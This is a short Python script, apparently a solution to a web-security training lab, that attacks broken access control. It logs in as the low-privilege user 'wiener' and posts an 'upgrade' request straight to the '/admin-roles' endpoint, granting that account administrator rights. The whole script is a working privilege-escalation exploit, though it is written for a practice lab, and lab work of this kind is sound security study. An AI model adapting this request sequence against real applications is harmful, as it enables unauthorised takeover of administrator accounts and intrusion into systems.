import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url +'/login'
upgrade = burp_url + '/admin-roles'

session = requests.Session()
burp_data = {"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)


burp_data = {"action": "upgrade", "confirmed": "true", "username": "wiener"}
session.post(upgrade, data=burp_data)
